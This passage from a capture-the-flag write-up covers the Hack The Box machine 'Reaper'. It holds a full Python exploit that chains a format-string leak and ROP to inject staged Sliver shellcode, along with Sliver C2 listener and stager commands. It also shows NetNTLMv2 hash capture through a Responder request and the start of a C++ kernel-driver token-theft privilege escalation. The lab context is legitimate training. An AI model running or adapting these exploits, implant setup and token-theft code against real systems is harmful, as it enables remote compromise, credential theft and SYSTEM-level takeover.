((cmd.exe /c "taskkill /F /IM dev_keysvc.exe" && timeout 1 && START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) || START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) && timeout 1 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" -WF C:\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g; t 33; p; pt; t 7'
```

## Getting the shell

With the ROPchain completed, and execution flow controlled on the stack, the only thing left to do is generate some shellcode and get a shell.

I'll use a staged `Sliver` implant.

I start `sliver-server`, enable multiplayer (so `sliver-client` can connect to it), and start an `mtls` listener.  I'll also generate a new profile, as my IP on the VPN has recently changed.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ sliver-server
[...]
[server] sliver > multiplayer 
[...]
[server] sliver > mtls -t 240
[...]
[server] sliver > new-operator --lhost 10.10.16.59 --save duff --name duff
```

That will stay running in a separate tab.  In a new tab, import the new-operator profile from above with `sliver-client`,  and connect
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ sliver-client import ./duff

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ sliver-client
? Select a server: duff@10.10.16.59 (d627e2adf130f60a)
Connecting to 10.10.16.59:31337 ...
[...]
```

Generate a stage2 profile.  A `stager` will perform an initial connect to a `stage-listener`, and this profile defines what stage2 to send back. 

```sh
sliver > profiles new --mtls 10.10.16.59 --skip-symbols --format shellcode --disable-sgn --os windows --arch amd64 --timeout 240 reaper

[*] Saved new implant profile reaper
```

Stand up a stage listener, and associate it with the profile.

```sh
sliver > stage-listener --url tcp://10.10.16.59:8443 --profile reaper

[*] No builds found for profile reaper, generating a new one
[*] Sliver name for profile reaper: GRUBBY_MONGER
[*] Job 3 (tcp) started
```

Generate a `stager`. 

```sh
sliver > generate stager --lhost 10.10.16.59 --lport 8443 --os windows --arch amd64 --timeout 240 --protocol tcp --format raw --save reaper_sc
```

The only modification I need to make to the PoC is to have the shellcode read in by file.

```python
shellcode = open("sc.bin", 'rb').read().decode('latin-1')
```

After sending the payload to the target, after about a minute or so, I get a session.

```sh
[*] Session 56ca80d6 GRUBBY_MONGER - 10.129.234.200:60901 (reaper) - windows/amd64 - Mon, 03 Nov 2025 23:13:23 PST

sliver > use 56ca80d6-e50f-43af-bed7-ff99bd089b9c

[*] Active session GRUBBY_MONGER (56ca80d6-e50f-43af-bed7-ff99bd089b9c)

sliver (GRUBBY_MONGER) > info

        Session ID: 56ca80d6-e50f-43af-bed7-ff99bd089b9c
              Name: GRUBBY_MONGER
          Hostname: reaper
              UUID: 45b23042-98ac-1874-26d9-444968eb4273
          Username: REAPER\keysvc
               UID: S-1-5-21-2661617556-2774986859-216721275-1002
               GID: S-1-5-21-2661617556-2774986859-216721275-513
               PID: 4520
                OS: windows
           Version: 10 build 19045 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://10.10.16.59:8888
    Remote Address: 10.129.234.200:60901
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Mon Nov  3 23:13:23 PST 2025 (16m23s ago)
      Last Checkin: Mon Nov  3 23:29:36 PST 2025 (10s ago)

```

## PoC

```python
#!/usr/bin/env python3
import os, sys, re, socket, binascii, time, base64
from struct import pack, unpack
from IPython import embed


NOTES=r'''
## @call rax
((cmd.exe /c "taskkill /F /IM dev_keysvc.exe" && timeout 1 && START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) || START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) && timeout 1 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" -WF C:\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp dev_keysvc+0x1937; g; g; g; bp dev_keysvc+0x16f1; g; t 33; p; pt; t 7'

[server] sliver > mtls -t 240
[server] sliver > new-operator --lhost 10.10.16.59 --save duff --name duff
$ sliver-client import ./duff
$ sliver-client
sliver > profiles new --mtls 10.10.16.59 --skip-symbols --format shellcode --disable-sgn --os windows --arch amd64 --timeout 240 reaper
sliver > stage-listener --url tcp://10.10.16.59:8443 --profile reaper
sliver > generate stager --lhost 10.10.16.59 --lport 8443 --os windows --arch amd64 --timeout 240 --protocol tcp --format raw --save reaper_sc
'''


def dprint(msg):
    if "debug" in sys.argv:
        print(msg)


def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')


badchars = ""
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC


def cx(ip, port, recv=0):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    if recv > 0:
        resp = sock.recv(4096)
        print(resp)
    return sock


def server_interact(sock,bufs):
    for x in range(0,len(bufs)):
        recvd = sock.recv(4096).decode('latin-1')
        dprint(recvd)
        if "key format" in recvd or 'Checking key' in recvd:
            recvd = sock.recv(4096).decode('latin-1')
            dprint(recvd)
        dprint(f"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]")
        sock.send(bufs[x].encode('latin-1'))


def get_leak(sock):
    # ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
    # └─$ echo "Hello" | base64 -w0
    bufs = [ "1\n", "110-FE9A1-550-A271-0109-SGVsbG8K\n", "2\n", "1\n", "%p\n", "2\n"]
    server_interact(sock,bufs)
    leak = sock.recv(4096).decode('latin-1').split("\n")[0].split(" ")[2]
    baseaddr = int(leak,16) - 132704
    print(f"** dev_keysvc leakaddr: 0x{leak} **")
    print(f"** dev_keysvc baseaddr: 0x{baseaddr:016x} **")
    return baseaddr 


def ROPchain1(base):
    return "".join([packlatin("<Q",x) for x in [
        ## 0x40 to r9
        base+0x20d9,        #: pop rbx ; ret ;
        0x40,
        base+0x1f90,        #: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;
        0xfeedcafedeadbeef,

        ## 0x1000 to r8
        base+0x150a,        #: pop rax ; ret ;
        0x1000,
        base+0xe97a,        #: xchg eax, edx ; ret ;
        base+0x1bd8c,       #: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;

        ## 0x1000 to rdx
		## Nothing needed, rdx is already 0x1000 because of r8 above

        ## rsp to rcx
        base+0x1fa0,        #: xor rbx, rsp ; ret ;
        base+0x1fb3,        #: mov r12, rbx ; ret ;  ## for jmp/call rsp later
        base+0x1fc2,        #: push rbx ; pop rax ; ret ;
        base+0x1f80,        #: mov rcx, rax ; ret ;

        ## call VirtualAlloc
        base+0x150a,        #: pop rax ; ret ;
        base+0x20000,       ## IAT VirtualAlloc VA
        base+0x1547f,       #: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        base+0x5d6d,        #: push rax ; pop rdi ; ret ;
        base+0x3db5,        #: push rdi ; ret ;

        ## realign RSP, RE: shadow space / VA scratch area
        base+0x175b,          #: add rsp, 0x28 ; ret ;
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,

        ## jmp/call rsp
        base+0x150a,        #: pop rax ; ret ;
        0xf0,
        base+0x368c         #: add rax, r12 ; mov rdx, r13 ; call rax ;
    ]])


def get_crash(sock,dev_keysvc):
    crash=1200
    crashlen=88
    onramp=("\x90")*crashlen
    SEH=ROPchain1(dev_keysvc)
    print(f"ROPchain len:{len(SEH)}")
    nopsled1 = ("\x90" * 0x80)
    fixup = (
        "\x48\x89\xC4"              #mov rsp,rax
        "\x48\x83\xEC\x98"          #sub rsp,byte +0x20
        "\x54"                      #push rsp
        "\x48\x89\xE5"              #mov rbp,rsp
        "\x48\x31\xC9"              #xor rcx,rcx
        "\x48\x31\xD2"              #xor rdx,rdx
        "\x48\x31\xC0"              #xor rax,rax
        "\x48\x31\xDB"              #xor rbx,rbx
        "\x48\x31\xFF"              #xor rdi,rdi
        "\x4D\x31\xC0"              #xor r8,r8
        "\x4D\x31\xE4"              #xor r12,r12            
    ) #32 bytes
    nopsled2 = ("\x90" *0x20)
    shellcode = open("reaper_sc", 'rb').read().decode('latin-1')
    print(f"shellcode len:{len(shellcode)}")
    offramp= ("\x90" * (crash - sum([len(x) for x in [
        onramp,
        SEH,
        nopsled1,
        fixup,
        nopsled2,
        shellcode
    ]])))
    compiled_payload = f"{onramp}{SEH}{nopsled1}{fixup}{nopsled2}{shellcode}{offramp}"
    print(f"compiled_payload len:{len(compiled_payload)}")
    pay = (base64.b64encode(bytearray(compiled_payload,'latin-1'))).decode('latin-1')
    bufs = [ "1\n", f"110-FE9A1-550-A271-0109-{pay}\n", "2\n", "3\n"]
    server_interact(sock,bufs)


def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port <optional>")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
        sock = cx(ip,port,0)

    dev_keysvc = get_leak(sock)
    get_crash(sock,dev_keysvc)


if __name__=="__main__":
    main()
```

User flag
```
C:\Users\keysvc\Desktop>type user.txt
type user.txt
07394cb49eb8e7470d7167db6d0f6935
```

## Post-exploitation enumeration

Seatbelt disclosed an NetNTLMv2 hash for reapersvc, and also the current process token has membership to the RDP group

```sh
sliver (GRUBBY_MONGER) > seatbelt -- -group=user

[...]
====== SecPackageCreds ======

  Version                        : NetNTLMv2
  Hash                           : keysvc::REAPER:1122334455667788:6a2bc1a5b19a1e287260491f51cc96bc:0101000000000000181db491664ddc01bcb68e6f51f99ba900000000080030003000000000000000000000000030000048a97bdcc3de78e80ef44f45118f7ca1bf92abf5ccb0823f095a6eb56ed016fa0a00100000000000000000000000000000000000090000000000000000000000

[...]
====== TokenGroups ======

Current Token's Groups

  REAPER\None                              S-1-5-21-2661617556-2774986859-216721275-513
  Everyone                                 S-1-1-0
  BUILTIN\Remote Desktop Users             S-1-5-32-555
  BUILTIN\Users                            S-1-5-32-545
  NT AUTHORITY\SERVICE                     S-1-5-6
  CONSOLE LOGON                            S-1-2-1
  NT AUTHORITY\Authenticated Users         S-1-5-11
  NT AUTHORITY\This Organization           S-1-5-15
  NT AUTHORITY\Local account               S-1-5-113
  LOCAL                                    S-1-2-0
  NT AUTHORITY\NTLM Authentication         S-1-5-64-10


```

NetNTLMv2-SSP hash for `keysvc` but it doesn't crack:
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ sudo hashcat -m 5600 keysvc.hash /usr/share/wordlists/rockyou.txt --force --quiet 
[sudo] password for notroot:
```

Also sent defaultcredentials to a listening responder:
```
PS C:\users\keysvc> invoke-webrequest -uri http://10.10.16.59/duffed.txt -usedefaultcredentials
```

```
[HTTP] NTLMv2 Client   : 10.129.234.200
[HTTP] NTLMv2 Username : REAPER\keysvc
[HTTP] NTLMv2 Hash     : keysvc::REAPER:cd0f87b6b1319306:6580FA82E3DC1054562FB5BC308ED25C:0101000000000000635AA7801F4EDC01D5E02131248798A50000000002000800530056004500490001001E00570049004E002D0045004B004900480032004D00540038004300330033000400140053005600450049002E004C004F00430041004C0003003400570049004E002D0045004B004900480032004D00540038004300330033002E0053005600450049002E004C004F00430041004C000500140053005600450049002E004C004F00430041004C0008003000300000000000000000000000003000000F67F829E12B9EC357B63981E6817E8C0A49B7440B2EF1CBB137473890CA08020A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310036002E00350039000000000000000000
```

Also doesn't crack.

Now that I have shell access, I was finally able to get my hands on `reaper.sys`.

```sh
sliver (GRUBBY_MONGER) > ls

C:\driver (1 item, 8.2 KiB)
===========================
-rw-rw-rw-  reaper.sys  8.2 KiB  Thu Jul 27 08:12:21 -0800 2023

sliver (GRUBBY_MONGER) > download reaper.sys

[*] Wrote 8432 bytes (1 file successfully, 0 files unsuccessfully) to /home/notroot/htb/machines/reaper/reaper.sys
```

I also found a service named `reaper`, which appears to have `reaper.sys` in its `binPath`.

```sh
PS C:\> sc query reaper
sc query reaper
sc : Access to the path 'C:\query' is denied.
At line:1 char:1
+ sc query reaper
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\query:String) [Set-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentWriterUnauthorizedAccessError,Microsoft.PowerShell.Commands.SetContentCommand
 

PS C:\> sc.exe query reaper
sc.exe query reaper

SERVICE_NAME: reaper 
        TYPE               : 1  KERNEL_DRIVER  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

PS C:\> sc.exe qc reaper
sc.exe qc reaper
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: reaper
        TYPE               : 1  KERNEL_DRIVER 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : \??\C:\driver\reaper.sys
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : reaper
        DEPENDENCIES       : 
        SERVICE_START_NAME :
```

## Analyzing Reaper.sys

It was an inevitability, really, that I take a look at `reaper.sys`.  As it turns out, the file is actually quite interesting for the fact that its loaded as a kernel module.  

I found the module has a main runtime, 

![[Pasted_image_20251108193415.png]]

The main runtime calls APIs such as `RtlGetVersion`, `IoCreateDevice`, `IoCreateSymbolicLink`, and `IoDeleteDevice`.  In the above screenshot, I found the top red box to be assignment operations, the righthand-operand shows `0x1000` but it is in fact a function call, that goes off to call `IofCompleteRequest`.  It just shows that way because I rebased to 0x0 so that I could get relative offsets while debugging.  

The second red box also calls a function which in the screenshot above I named `threadwork`, but later after researching generally a kernel driver could be interacted with by a userland application, I discovered this function must actually be `DispatchDeviceControl`.

It is that second red box that is actually the most interesting and relevant to the task at hand.

![[Pasted_image_20251108195337.png]]

When we think about the way `DispatchDeviceControl` is meant to be implemented, https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/dispatchdevicecontrol-and-dispatchinternaldevicecontrol-routines

```
A driver's dispatch routines (see [**DRIVER_DISPATCH**](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch)) handle IRPs with I/O function codes of [**IRP_MJ_DEVICE_CONTROL**](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control) and [**IRP_MJ_INTERNAL_DEVICE_CONTROL**](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-internal-device-control), respectively.

For every common type of peripheral device, the system defines a set of I/O control codes for **IRP_MJ_DEVICE_CONTROL** requests. New drivers for each type of device must support these requests. In most cases, these public I/O control codes for each type of device are not exported to user-mode applications.
```

The conditional statements on lines 14, 30, and 31 directly correlate to the following values seen as the source value in the comparison op:

![[Pasted_image_20251108200018.png]]

We can see that with a control code of `-0x7fffdffd`, or `0x80002003`, in the IF statement and clause, on line 21 there is a call to `ExAllocatePoolWithTag`.  The size is `0x20`, or 64 bytes.  The tag is `0x70616552`, which translates to `peaR`, or `Reap` backwards.  

Line 22 checks if the allocation was good, if not we jump out of here to label `LAB_00001165` outside the IF statement, looks like function cleanup.

Lines 23 through 27 take `parameter2` the function was called with (pointed to by `piVar3`) and assign it into the allocation.

Of interest, but before the call to `ExAllocatePoolWithTag`, on line 20, is a check that the first value pointed-to by `piVar3`, is equivalent to `0x6a55cc9e`. If it is, then execution continues to call `ExAllocatePoolWithTag`.  If it isn't, then this would also jump to the label `LAB_00001165` outside the IF statement, and lead to function cleanup.  So this value must be a checksum.  

In the ELSE clause of the IF statement, we find there are two conditionals that can be met.  The first is if the control code is `-0x7fffdff9`, or `0x80002007`,  then we call `ExFreePoolWithTag`.  It would get called with arguments, the region of memory that was allocated, and the tag `0x70616552`, or `peaR` in ASCII.

But if the control code isn't `-0x7fffdff9`, or `0x80002007`, then we check if the control code is `-0x7fffdff5`, or `0x8000200b`.  If this is the case then what follows is a call to `PsLookupThreadByThreadId`, `KeSetPriorityThread`, and `ObfDereferenceObject`.  From the allocation, pointer-to-pointer offset 6 of the allocation is assigned whatever pointer-to-pointer offset 4 of the allocation references (given that neither are null).  In effect, a write operation from a source buffer to a destination buffer.  This is a user controllable commit because the allocation and data assigned to the allocation are user controlled.  The commit on the other hand is by the kernel module, using the user-controlled input.

Lets talk about how to interact with a kernel module.

### Interacting with a kernel module

Google search:  `usermode connect to kernel mode driver example`

Gemini response:

Connecting user-mode applications to kernel-mode drivers on Windows typically involves using DeviceIoControl for communication. This mechanism allows user-mode applications to send requests and data to a kernel-mode driver, and receive data back.

Here is an example illustrating the basic steps:

1. Kernel-Mode Driver (e.g., WDM or KMDF):

- **Define Custom IOCTLs:** Create unique control codes (IOCTLs) that the user-mode application will use to specify the desired operation. These are defined using macros like `CTL_CODE`.

```c++
    #define IOCTL_MYDRIVER_DO_SOMETHING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
```

*  [Implement IRP Dispatch Routines](https://www.google.com/search?sca_esv=cc001bef2c82a561&cs=1&sxsrf=AE3TifOtOdfdaatkSkf6tXDbvIQ06Na37Q%3A1762575809486&q=Implement+IRP+Dispatch+Routines&sa=X&ved=2ahUKEwj1vbHH2uGQAxWUD0QIHS6uNAsQxccNegQIFxAD&mstk=AUtExfDUCTFp_oVs2QmKjBRRUxtETh-Q0JGqhZSy7AB3g0ApWv8kitnn1TV3vVNGn3GIqR-Q6isAExTGROnWOqmcOS5FdJ90qaoHR7OXMtt0J1svd9-KpZtiY69yOye0PiXtbFk8mb-YG-tZAl0BWewvtjEEvNP80oO2jNviC3aMLZSDL0ot2s0Cm9w1OJuKqGk1p4aU516wDpbVUHFPpeB2cO2Fjqde6ouJqUSQUsX5X6ePnLTPTT3ythBE5rJxDNujuu4D0eO9SPPngKMVdRwjt1JF&csui=3)
    
    The driver needs to handle `IRP_MJ_DEVICE_CONTROL` requests in its `DispatchDeviceControl` routine. Inside this routine, the driver examines the `IoControlCode` from the IRP to determine which custom IOCTL was sent and then performs the corresponding action.
    
-  [Access user Buffers](https://www.google.com/search?sca_esv=cc001bef2c82a561&cs=1&sxsrf=AE3TifOtOdfdaatkSkf6tXDbvIQ06Na37Q%3A1762575809486&q=Access+User+Buffers&sa=X&ved=2ahUKEwj1vbHH2uGQAxWUD0QIHS6uNAsQxccNegQIHBAD&mstk=AUtExfDUCTFp_oVs2QmKjBRRUxtETh-Q0JGqhZSy7AB3g0ApWv8kitnn1TV3vVNGn3GIqR-Q6isAExTGROnWOqmcOS5FdJ90qaoHR7OXMtt0J1svd9-KpZtiY69yOye0PiXtbFk8mb-YG-tZAl0BWewvtjEEvNP80oO2jNviC3aMLZSDL0ot2s0Cm9w1OJuKqGk1p4aU516wDpbVUHFPpeB2cO2Fjqde6ouJqUSQUsX5X6ePnLTPTT3ythBE5rJxDNujuu4D0eO9SPPngKMVdRwjt1JF&csui=3)
    
    When using `METHOD_BUFFERED` or `METHOD_IN_DIRECT`/`METHOD_OUT_DIRECT`, the system handles buffer copying. For `METHOD_NEITHER`, the driver directly accesses user-mode buffers, requiring careful validation to prevent security vulnerabilities.    

2. User-Mode Application:

- **Open a Handle to the Device:** Use `CreateFile` to obtain a handle to the kernel-mode device object exposed by the driver. The device name will typically be in the format `\\.\MyDriverName`.

```c++
    HANDLE hDevice = CreateFile(
	    L"\\\\.\\MyDriverName",
	    GENERIC_READ | GENERIC_WRITE,                                
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
```

- **Send IOCTL Requests:** Use `DeviceIoControl` to send the custom IOCTLs to the driver, along with any input data, and receive output data.

```c++
    DWORD bytesReturned;    
    CHAR inputBuffer[] = "Hello from user-mode!";    
    CHAR outputBuffer[256];    
    BOOL success = DeviceIoControl(
	    hDevice,
		IOCTL_MYDRIVER_DO_SOMETHING,
		inputBuffer, 
		sizeof(inputBuffer),
		outputBuffer, 
		sizeof(outputBuffer),
		&bytesReturned,
		NULL
	);
```

- **Close the Device Handle:** Release the handle when no longer needed using `CloseHandle`.

Example Flow:

- The user-mode application opens a handle to the driver's device object.
- It calls `DeviceIoControl`, specifying `IOCTL_MYDRIVER_DO_SOMETHING`, an input buffer, and an output buffer.
- The operating system intercepts this call and creates an IRP, which is then sent to the kernel-mode driver.
- The driver's `DispatchDeviceControl` routine receives the IRP, identifies `IOCTL_MYDRIVER_DO_SOMETHING`, processes the input data, and places any results in the output buffer.
- The operating system copies the output data back to the user-mode application's output buffer.
- `DeviceIoControl` returns, and the user-mode application can then process the received data.

### Crash course in kernel driver development and debugging

I am at this point in a bit over my head it seems, so I reviewed a crash course on kernel driver development and debugging.  It's about three hours long, and following along made it take a whole lot longer than that even.  But it was very informative and overall I would say the juice was well worth the squeeze.

"CREATE and DEBUG a Windows KERNEL device driver!"
https://www.youtube.com/watch?v=eE-o25o8ljU

The crash course premise assumes debugging of a kernel driver in active development, developed and then remotely deployed using `VisualStudio` and remotely debugged using `windbg`.  Obviously that doesn't fit the usecase here, because we already have the driver.  Nevertheless, much of it could be applied to the current task.  Some additional fill in the blanks were needed.

Such as this:  https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-

And some key take-aways, such as breaking on load of the kernel driver:

```
sxe ld reaper
```

For debugging, I found the only real way to do it is by remotely debugging a separate machine.  In this configuration, you have a host debugger, that connects to a target debugee which runs the kernel driver.  In this configuration, the debugger controls the debugee remotely.  So I stood up a second Windows 10 Pro VM as the target debugee. 
On the target debugee, I tried to replicate the kernel driver and service to match Reaper.

```
sc.exe create reaper type= kernel start= auto binPath= c:\driver\reaper.sys
```

This was only possible when driver signing was disabled on the target debugee, for that, the following and a restart, after which I could create the service above:

```
bcdedit /set testsigning on
```

And the following ran on the target debugee to enable remotely debugging the kernel:

```
PS C:\Program Files (x86)\Windows Kits\10\Debuggers\x64> .\kdnet 192.168.56.100 50000

Enabling network debugging on Intel(R) PRO/1000 MT Desktop Adapter.

To debug this machine, run the following command on your debugger host machine.
windbg -k net:port=50000,key=[...truncate...]

Then reboot this machine by running shutdown -r -t 0 from this command prompt.
```

The following, ran from the debugging host:

```
& "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg" -k net:port=50000,key=[...truncate...]
```

After which point I can connect to the target debugee by rebooting it, and it connects automatically.

![[Pasted_image_20251108213616.png]]

### Building the PoC

I started by creating a new C++ console application in VisualStudio.  

The call to `DeviceIoControl` needs a handle to the module, for that I created a global variable that the handle could be assigned into, and a function for getting a handle.

```c++
HANDLE reap = NULL;

HANDLE ReaperSysHandle(void) {
    HANDLE reaper = CreateFile(
        /*[in]      LPCSTR                          lpFileName*/ L"\\\\.\\Reaper",
        /*[in]      DWORD                      dwDesiredAccess*/ GENERIC_READ | GENERIC_WRITE,
        /*[in]      DWORD                          dwShareMode*/ 0,
        /*[in, opt] LPSECURITY_ATTRIBUTES lpSecurityAttributes*/ NULL,
        /*[in]      DWORD                dwCreationDisposition*/ OPEN_EXISTING,
        /*[in]      DWORD                 dwFlagsAndAttributes*/ FILE_ATTRIBUTE_NORMAL,
        /*[in, opt] HANDLE                       hTemplateFile*/ NULL
    );
    printf("[handle] Good handle for device \\\\.\\Reaper: 0x%x\n", reap);
    return reaper;
}
```

In my `main`, I could then assign the handle into it, and eventually also `CloseHandle` at the end of runtime.

```c++
int main(void){
	reap = ReaperSysHandle();
	[...]
	if (reap) return CloseHandle(reap);
}
```

I needed a way to invoke `DeviceIoControl`, it would be called in different ways depending on what the control code is and the operation that would be performed.  In all cases it would be called with a control code and some data. 

```c++
void Invoke_DeviceIoControl(DWORD ctrlcode, REAPER *data) {
    unsigned char outBuf[2048] = { 0 };
    ULONG outLen;

    DeviceIoControl(
        /*[in]        HANDLE               hDevice*/ reap,
        /*[in]        DWORD        dwIoControlCode*/ ctrlcode,
        /*[in, opt]   LPVOID            lpInBuffer*/ (LPVOID)data,
        /*[in]        DWORD          nInBufferSize*/ (ULONG)sizeof(struct REAPER),
        /*[out, opt]  LPVOID           lpOutBuffer*/ outBuf,
        /*[in]        DWORD         nOutBufferSize*/ sizeof(outBuf),
        /*[out, opt]  LPDWORD      lpBytesReturned*/ &outLen,
        /*[in, out, opt] LPOVERLAPPED lpOverlapped*/ NULL
    );
}
```

As for the control codes, and the data, the control codes are known, the data would be some type of structure that includes a checksum, a thread ID, a thread priority, some junk index that never appeared to be referenced, and two pointers, one for a source buffer and one for a destination buffer.

```c++
#define DISPATCH_ALLOCATE_POOL          0x80002003
#define DISPATCH_FREE_POOL              0x80002007
#define DISPATCH_COMMIT_THREAD          0x8000200b

typedef struct REAPER {
    DWORD checksum;
    DWORD tid;
    DWORD pri;
    DWORD junk;
    ULONGLONG src;
    ULONGLONG dst;
} REAPER;
```

At some point, I had come across this:  https://www.slideshare.net/slideshow/0x002-windows-priv-esc-a-low-level-explanation-of-token-theft/259071925

It talks about stealing SYSTEM's token out of its EPROCESS struct and injecting it into the current process (token theft).  A talk about the need for read-what-where and write-what-where primitives for achieving this.

As for handling the data, a higher-level function would be needed to wrap it all together.  We may have need to read some data from a source buffer into a local buffer under our control, so that it can be printed back or used.  And there might be a case where we need to read some data and write it into an arbitrary remote buffer.  

An atomic operation would see an allocation of a tagged pool of memory, a commit of that memory to a thread, and then freeing up that allocation.  So there would need to be some functions that call `DeviceIoControl` in these ways.

The following method should be able to handle both of the local buffer and remote buffer cases.

I use the terms local buffer and remote buffer in the sense of the buffer in relation to the exploit binary.

```c++
#define OP_LOCAL                        0x0
#define OP_REMOTE                       0x1

ULONGLONG Action(UINT operation, ULONGLONG srcAddress, ULONGLONG dstAddress) {

    ULONGLONG output;
    REAPER data { 0x6A55CC9E, GetCurrentThreadId(), 0, 0, srcAddress, (ULONGLONG)&output };
    if (operation == OP_REMOTE) {
        data.dst = dstAddress;
    }
    Invoke_DeviceIoControl(DISPATCH_ALLOCATE_POOL, &data);
    Invoke_DeviceIoControl(DISPATCH_FREE_POOL, NULL);
    Invoke_DeviceIoControl(DISPATCH_COMMIT_THREAD, NULL);
    return output;
}
```

And then at some point I performed the following Google search:

```
steal token windows kernel exploit github
```

The first result: https://github.com/xct/windows-kernel-exploits

`xct` is the maker of `Reaper` machine.  So already my attention has been pinged for IRQ.  Another connected dot, in this file which seems to relate to the walking of EPROCESS structure.

https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/HevdPoolOverflowWin7x64.cpp#L60

Here it is:

```c++
	eProcResult GetCurrentEProcess() {
		// find system EPROCESS & token		
		QWORD systemProc = getSystemEProcess();
		printf("[>] System _EPROCESS: 0x%llx\n", systemProc);

		// walk ActiveProcessLinks to find our process
		DWORD currentProcessPid = GetCurrentProcessId();
		//printf("[>] Current Process PID %d\n", currentProcessPid);
		BOOL found = false;
		QWORD cProcess = systemProc;
		DWORD cPid = 0;
		QWORD cTokenPtr;

		while (!found) {
			cProcess = arbRead(cProcess + 0x188); // get next entry in ActiveProcessLinks (dt _EPROCESS)		
			cProcess -= 0x188; // get back to start of _EPROCESS (otherwise it points directly to next entrys 0x188 offset)
			cPid = arbRead(cProcess + 0x180);
			cTokenPtr = arbRead(cProcess + 0x208);
			if (cPid == currentProcessPid) {
				printf("[>] Current Process: %llx (PID: %d, TOKEN_PTR: %llx)\n", cProcess, cPid, cTokenPtr);
				found = true;
				break;
			}
		}
		if (!found) {
			printf("Could not find current process in ActiveProcessLinks\n");
			exit(-1);
		}
		eProcResult result{};
		result.eProcess = cProcess;
		result.tokenPtr = cTokenPtr;
		result.pid = cPid;
		return result;
	}
```

However there are a number of things that need adjustment.  For example it should be able to take an arbitrary process ID.  The `EPROCESS` offsets specified in the function are in relation to `Windows 7 x64`, but this is `Windows 10 Pro x64`,  so is the real `REAPER` target machine, and the first document makes mention that the offsets are dependent on the version of windows as the structure keeps changing with each new version.

And for the offsets, `EPROCESS` under `Windows 10 Pro x64`:

![[Pasted_image_20251109012409.png]]

![[Pasted_image_20251109012511.png]]

Here is what I finally settled on:

```c++
#define EPROCESS_UniqueProcessId        0x440
#define EPROCESS_ActiveProcessLinks     0x448
#define EPROCESS_Token                  0x4b8

eProcResult GetCurrentEProcessByPid(DWORD pid) {
    // find system EPROCESS & token		
    QWORD systemProc = getSystemEProcess();
    printf("[>] System _EPROCESS: 0x%llx\n", systemProc);

    // walk ActiveProcessLinks to find our process
    BOOL found = 0;
    QWORD cProcess = systemProc;
    DWORD cPid = 0;
    QWORD cTokenPtr;

    while (!found) {
        cProcess = Action(OP_LOCAL, cProcess + EPROCESS_ActiveProcessLinks, 0x0); // get next entry in ActiveProcessLinks (dt _EPROCESS)		
        cProcess -= EPROCESS_ActiveProcessLinks; // get back to start of _EPROCESS (otherwise it points directly to next entrys 0x188 offset)
        cPid = Action(OP_LOCAL, cProcess + EPROCESS_UniqueProcessId, 0x0);
        cTokenPtr = Action(OP_LOCAL, cProcess + EPROCESS_Token, 0x0);
        if (cPid == pid) {
            printf("[>] Process: %llx (PID: %d, TOKEN_PTR: %llx)\n", cProcess, cPid, cTokenPtr);
            found = true;
            break;
        }
    }
    if (!found) {
